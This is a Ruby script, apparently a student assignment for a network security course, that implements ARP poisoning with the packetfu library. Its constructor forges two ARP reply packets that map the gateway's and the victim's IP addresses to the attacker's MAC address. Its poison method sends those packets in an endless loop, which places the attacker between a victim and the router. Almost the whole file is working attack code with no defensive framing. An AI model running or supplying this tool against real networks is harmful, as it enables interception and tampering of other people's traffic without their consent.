#!/usr/bin/env ruby
# ================================================================================================ 
# arp.rb
# 
# Andrew Maledy
# COMP 8505 - Assignment 3
# 
# The class which will handle our arp posioning. Very simple, just generates packets and 
# continuously sends it out.
#
# ================================================================================================
require 'rubygems'
require 'packetfu'

class ARP

	@v_packet = '' # victim response packet
	@r_packet = '' # router response packet
	@ifconfig = ''
	@ifname = ''
	# ============================================================================================
	# Initialize() (constructor)
	# 
	# Initialize the class with an arp packet
	#
	# ============================================================================================
	def initialize(victim_ip, victim_mac, gateway, router_mac, iface = "em1")
        
        @ifconfig = PacketFu::Utils.whoami?(:iface => iface) 
        @ifname = iface
        @v_packet = PacketFu::ARPPacket.new
        @r_packet = PacketFu::ARPPacket.new
        # Make the victim response packet
        
        #link layer components
        @v_packet.eth_saddr = @ifconfig[:eth_saddr]       # attacker MAC address
        @v_packet.eth_daddr = victim_mac                 # the victim's MAC address
        #arp components
        
        @v_packet.arp_saddr_mac = @ifconfig[:eth_saddr]
        @v_packet.arp_daddr_mac = victim_mac
        @v_packet.arp_saddr_ip = gateway
        @v_packet.arp_daddr_ip = victim_ip
        @v_packet.arp_opcode = 2   
       
        #Make the router response packet
        
        #link layer components
        @r_packet.eth_saddr = @ifconfig[:eth_saddr]
        @r_packet.eth_daddr = router_mac
        #arp components
        @r_packet.arp_saddr_mac = @ifconfig[:eth_saddr]
        @r_packet.arp_daddr_mac = router_mac
        @r_packet.arp_saddr_ip = victim_ip
        @r_packet.arp_daddr_ip = gateway
        @r_packet.arp_opcode = 2

	end
	# ============================================================================================
	# Poison()
	# 
	# Starts a loop continuously sending packets to the victim. Should probably be called on it's
	# own thread so you can actually do something while you're poisoning.
	#
	# ============================================================================================	
	def poison()
	        puts "ARP Poisining started..."
		     while true do
		     	@v_packet.to_w(@ifname)
		     	@r_packet.to_w(@ifname)
		     end
	end
end
